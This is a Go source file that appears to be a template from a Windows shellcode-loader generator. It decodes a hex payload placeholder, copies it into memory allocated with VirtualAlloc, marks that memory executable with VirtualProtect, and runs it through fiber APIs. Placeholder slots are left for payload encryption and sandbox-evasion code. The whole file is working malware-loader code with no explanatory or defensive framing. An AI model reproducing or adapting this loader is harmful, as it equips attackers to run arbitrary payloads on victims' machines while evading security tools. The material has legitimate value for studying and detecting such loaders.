package main

import (
	"encoding/hex"
	"golang.org/x/sys/windows"
	"unsafe"
	//__ENCRYPTMODULE__
	//__SANDBOXMODULE__
)

const (
	MemCommit       = 0x1000
	MemReserve      = 0x2000
	PageExecuteRead = 0x20
	PageReadwrite   = 0x04
)

func main() {
	//__SANDBOX__
	shellcode, _ := hex.DecodeString("__SHELLCODE__")
	//__ENCRYPTCODE__
	kernel32 := windows.NewLazySystemDLL("kernel32.dll")
	ntdll := windows.NewLazySystemDLL("ntdll.dll")
	VirtualAlloc := kernel32.NewProc("VirtualAlloc")
	VirtualProtect := kernel32.NewProc("VirtualProtect")
	RtlCopyMemory := ntdll.NewProc("RtlCopyMemory")
	ConvertThreadToFiber := kernel32.NewProc("ConvertThreadToFiber")
	CreateFiber := kernel32.NewProc("CreateFiber")
	SwitchToFiber := kernel32.NewProc("SwitchToFiber")
	fiberAddr, _, _ := ConvertThreadToFiber.Call()
	addr, _, _ := VirtualAlloc.Call(0, uintptr(len(shellcode)), MemCommit|MemReserve, PageReadwrite)
	_, _, _ = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
	oldProtect := PageReadwrite
	_, _, _ = VirtualProtect.Call(addr, uintptr(len(shellcode)), PageExecuteRead, uintptr(unsafe.Pointer(&oldProtect)))
	fiber, _, _ := CreateFiber.Call(0, addr, 0)
	_, _, _ = SwitchToFiber.Call(fiber)
	_, _, _ = SwitchToFiber.Call(fiberAddr)
}
